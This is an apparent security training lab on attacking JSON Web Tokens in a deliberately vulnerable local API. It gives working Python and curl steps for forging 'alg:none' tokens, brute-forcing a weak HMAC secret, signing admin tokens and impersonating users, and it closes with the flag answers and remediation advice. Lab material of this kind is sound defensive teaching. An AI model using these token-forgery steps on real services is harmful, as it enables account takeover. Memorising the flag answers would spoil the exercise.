# Lab 10: JWT Token Attacks

## Objective

Decode, analyze, brute-force, and forge JSON Web Tokens (JWTs) to bypass authentication and impersonate the admin user.

## Metadata

| Field | Value |
|---|---|
| **Difficulty** | Hard |
| **Estimated Time** | 90 minutes |
| **Prerequisites** | Labs 01–09 completed, understanding of Base64 and cryptography basics, Python 3 with `requests` and `PyJWT` |
| **OWASP API Category** | API2:2023 – Broken Authentication |

---

## Background

### What Is a JWT?

A JSON Web Token (JWT) is a compact, URL-safe token format used for transmitting claims between parties. It consists of three Base64URL-encoded parts separated by dots:

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

| Part | Contains | Example |
|---|---|---|
| **Header** | Algorithm + token type | `{"alg":"HS256","typ":"JWT"}` |
| **Payload** | Claims (user data) | `{"user_id":1,"username":"alice","role":"user"}` |
| **Signature** | HMAC/RSA signature | `HMACSHA256(base64(header)+"."+base64(payload), secret)` |

### Common JWT Attacks

| Attack | Description | Risk |
|---|---|---|
| **None Algorithm** | Set `alg` to `none` → signature not verified | Full auth bypass |
| **Weak Secret** | Brute-force the HMAC secret key | Token forgery |
| **Algorithm Confusion** | Switch RS256 to HS256, sign with public key | Token forgery |
| **Expired Token Reuse** | Use tokens past their expiration | Session hijacking |
| **Missing Claims** | No `exp`, `iss`, `aud` validation | Token misuse |
| **Key Injection (JWK/JKU)** | Inject attacker's public key in header | Token forgery |

### The "none" Algorithm Attack

The JWT spec defines `"alg":"none"` as "unsigned." If the server doesn't explicitly reject this algorithm, an attacker can:
1. Create a JWT with `{"alg":"none"}`
2. Set any claims they want
3. Leave the signature empty
4. The server accepts the token without verification

### Weak Secret Attack

If HMAC (HS256/HS384/HS512) is used, the secret key signs the token. If the secret is weak or predictable, attackers can:
1. Capture a valid JWT
2. Brute-force the secret using tools like `hashcat` or `jwt-cracker`
3. Sign new tokens with arbitrary claims

---

## Lab Environment

| Item | Value |
|---|---|
| Target API | `http://localhost:5000` |
| JWT Algorithm | HS256 |
| JWT Secret | `socialhack-secret-key` (weak — brute-forceable) |
| Admin User ID | 4 |

### Required Tools

```bash
# Install PyJWT (Python JWT library)
pip install PyJWT requests
```

---

## Tasks

### Task 1: Obtain and Decode a JWT

**Goal:** Login as alice, capture the JWT, and decode it manually.

**Steps:**

1. Login as alice and capture the JWT token:

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "JWT: $TOKEN"
```

2. Split the token into its three parts:

```bash
echo "$TOKEN" | tr '.' '\n'
```

3. Decode each part (Base64URL decode):

```bash
# Decode header
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo

# Decode payload
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
```

4. Or use Python:

```python
import base64, json

token = "YOUR_TOKEN_HERE"
parts = token.split(".")

# Add padding and decode
for i, part in enumerate(parts[:2]):
    padded = part + "=" * (4 - len(part) % 4)
    decoded = base64.urlsafe_b64decode(padded)
    name = "Header" if i == 0 else "Payload"
    print(f"{name}: {json.loads(decoded)}")
```

> **🚩 FLAG 1:** What algorithm is used in the JWT header?

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
The JWT header contains an <code>alg</code> field that specifies the signing algorithm.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
Decode the first part (header) of the JWT using Base64. Look for the <code>alg</code> value.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
The algorithm is <code>HS256</code> (HMAC-SHA256). The header looks like: <code>{"alg":"HS256","typ":"JWT"}</code>
</details>

---

### Task 2: Attempt the "none" Algorithm Attack

**Goal:** Create a JWT with `alg:none` to bypass signature verification.

**Steps:**

1. Create a JWT header with `alg` set to `none`:

```python
import base64, json

# Create unsigned JWT
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=').decode()

payload = base64.urlsafe_b64encode(
    json.dumps({
        "user_id": 4,
        "username": "admin",
        "role": "admin"
    }).encode()
).rstrip(b'=').decode()

# The token has an empty signature
forged_token = f"{header}.{payload}."
print(f"Forged token: {forged_token}")
```

2. Try using the forged token:

```bash
curl -s http://localhost:5000/api/v1/admin/users \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

3. Check if the server accepts the `none` algorithm. Many servers are vulnerable to variations:
   - `"alg": "none"`
   - `"alg": "None"`
   - `"alg": "NONE"`
   - `"alg": "nOnE"`

<details>
<summary>Hint 1</summary>
The "none" algorithm tells the server not to verify the signature at all. Create a three-part token where the third part (signature) is empty.
</details>

<details>
<summary>Hint 2</summary>
The format is: <code>base64(header).base64(payload).</code> — note the trailing dot with nothing after it.
</details>

<details>
<summary>Hint 3</summary>
If the server rejects <code>"none"</code>, try case variations. Some JWT libraries only check for the exact string <code>"none"</code> but accept <code>"None"</code> or <code>"NONE"</code>.
</details>

---

### Task 3: Brute-Force the JWT Secret

**Goal:** Crack the weak HMAC secret key used to sign tokens.

**Steps:**

1. You need a valid JWT token (from Task 1) and a wordlist.

2. The brute-force approach — try signing the token with each candidate secret and compare signatures:

```python
import hmac
import hashlib
import base64

token = "YOUR_TOKEN_HERE"
header_payload = ".".join(token.split(".")[:2])

# Common weak secrets to try
wordlist = [
    "secret", "password", "123456", "jwt-secret", "my-secret",
    "api-secret", "token-secret", "socialhack-secret-key",
    "super-secret", "changeme", "default", "admin",
    "socialhack", "hackme", "key123",
]

for candidate in wordlist:
    # Compute HMAC-SHA256
    signature = base64.urlsafe_b64encode(
        hmac.new(
            candidate.encode(),
            header_payload.encode(),
            hashlib.sha256
        ).digest()
    ).rstrip(b'=').decode()

    # Compare with actual signature
    actual_sig = token.split(".")[2]
    if signature == actual_sig:
        print(f"[!] SECRET FOUND: {candidate}")
        break
else:
    print("[-] Secret not found in wordlist")
```

3. Alternatively, use `hashcat` for GPU-accelerated cracking:

```bash
# Save the JWT to a file
echo "$TOKEN" > jwt.txt

# Crack with hashcat (mode 16500 = JWT)
hashcat -m 16500 jwt.txt /path/to/wordlist.txt
```

> **🚩 FLAG 2:** What is the brute-forced JWT secret?

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
The secret is a simple English phrase. Try common patterns like <code>appname-secret-key</code>.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
The application is called "SocialHack." The secret follows the pattern <code>[appname]-secret-key</code>.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
The JWT secret is: <code>socialhack-secret-key</code>
</details>

---

### Task 4: Forge an Admin JWT

**Goal:** Create a valid JWT with admin privileges using the cracked secret.

**Steps:**

1. Install PyJWT if not already installed:

```bash
pip install PyJWT
```

2. Forge an admin token:

```python
import jwt
import time

# The cracked secret
SECRET = "socialhack-secret-key"

# Create admin payload
payload = {
    "user_id": 4,
    "username": "admin",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400  # 24 hours
}

# Sign with the cracked secret
forged_token = jwt.encode(payload, SECRET, algorithm="HS256")
print(f"Forged admin token: {forged_token}")
```

3. Verify the forged token works:

```bash
FORGED="YOUR_FORGED_TOKEN"

# Access admin endpoints
curl -s http://localhost:5000/api/v1/admin/users \
  -H "Authorization: Bearer $FORGED"

curl -s http://localhost:5000/api/v1/admin/stats \
  -H "Authorization: Bearer $FORGED"
```

---

### Task 5: Access Admin Endpoints with Forged Token

**Goal:** Use the forged admin JWT to access all admin functionality.

**Steps:**

1. List all users (admin only):

```bash
curl -s http://localhost:5000/api/v1/admin/users \
  -H "Authorization: Bearer $FORGED" | python3 -m json.tool
```

2. Get platform statistics:

```bash
curl -s http://localhost:5000/api/v1/admin/stats \
  -H "Authorization: Bearer $FORGED"
```

3. Delete a user (careful — this is destructive):

```bash
# DON'T actually delete users you need for other labs
# This is just to demonstrate the capability
curl -s -X DELETE http://localhost:5000/api/v1/admin/users/99 \
  -H "Authorization: Bearer $FORGED"
```

> **🚩 FLAG 3:** Successfully access admin endpoints with the forged token

<details>
<summary>Hint 1</summary>
Make sure your forged token includes <code>user_id</code>, <code>username</code>, and <code>role</code> claims that match what the admin endpoints expect.
</details>

<details>
<summary>Hint 2</summary>
The admin user has <code>user_id=4</code>, <code>username="admin"</code>, <code>role="admin"</code>. Include all three in your payload.
</details>

<details>
<summary>Hint 3</summary>
If you get a 401 error, check that: (1) the secret is correct, (2) the algorithm is HS256, (3) the token hasn't expired, (4) the <code>Authorization</code> header format is <code>Bearer &lt;token&gt;</code>.
</details>

---

### Task 6: Token Manipulation Techniques (Bonus)

**Goal:** Explore additional JWT manipulation techniques.

**Steps:**

1. **Modify expiration:** Create a token that never expires:

```python
payload = {
    "user_id": 4,
    "username": "admin",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 315360000  # 10 years
}
```

2. **Change user identity:** Create tokens for any user:

```python
# Impersonate any user
for user_id in range(1, 10):
    token = jwt.encode({"user_id": user_id, "role": "user"}, SECRET, algorithm="HS256")
    print(f"User {user_id}: {token}")
```

3. **Add custom claims:** Inject additional permissions:

```python
payload = {
    "user_id": 4,
    "username": "admin",
    "role": "admin",
    "is_superadmin": True,
    "permissions": ["read", "write", "delete", "admin"]
}
```

---

## Flags Summary

| Flag | Description | Value |
|---|---|---|
| FLAG 1 | JWT algorithm used | `HS256` |
| FLAG 2 | Brute-forced JWT secret | `socialhack-secret-key` |
| FLAG 3 | Access admin endpoints with forged token | Successfully list users/stats via /admin/* |

---

## Remediation

### 1. Use Strong, Random Secrets

```python
import secrets
# Generate a 256-bit random secret
JWT_SECRET = secrets.token_hex(32)
# Result: "a1b2c3d4e5f6..." (64 hex characters)
```

### 2. Explicitly Reject the "none" Algorithm

```python
# PyJWT 2.x does this by default, but be explicit:
decoded = jwt.decode(
    token,
    SECRET,
    algorithms=["HS256"],   # ONLY allow HS256
    # PyJWT 2.x rejects "none" by default
)
```

### 3. Use Asymmetric Algorithms (RS256/ES256)

```python
# Generate RSA key pair
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)
public_key = private_key.public_key()

# Sign with private key (server only)
token = jwt.encode(payload, private_key, algorithm="RS256")

# Verify with public key (anyone can verify, no one can forge)
decoded = jwt.decode(token, public_key, algorithms=["RS256"])
```

### 4. Implement Token Expiration and Rotation

```python
payload = {
    "user_id": user.id,
    "iat": int(time.time()),            # Issued at
    "exp": int(time.time()) + 900,      # Expires in 15 minutes
    "jti": str(uuid.uuid4()),           # Unique token ID
}
```

### 5. Validate All Claims

```python
decoded = jwt.decode(
    token,
    SECRET,
    algorithms=["HS256"],
    options={
        "require": ["exp", "iat", "user_id"],  # Required claims
        "verify_exp": True,
    }
)
```

### 6. Implement Token Revocation

- Maintain a server-side blacklist of revoked tokens
- Use short-lived access tokens + long-lived refresh tokens
- Store active sessions in a database

---

## References

- [JWT.io — JWT Debugger](https://jwt.io/)
- [RFC 7519 — JSON Web Token](https://tools.ietf.org/html/rfc7519)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger — JWT Attacks](https://portswigger.net/web-security/jwt)
- [Auth0 — Critical JWT Vulnerabilities](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
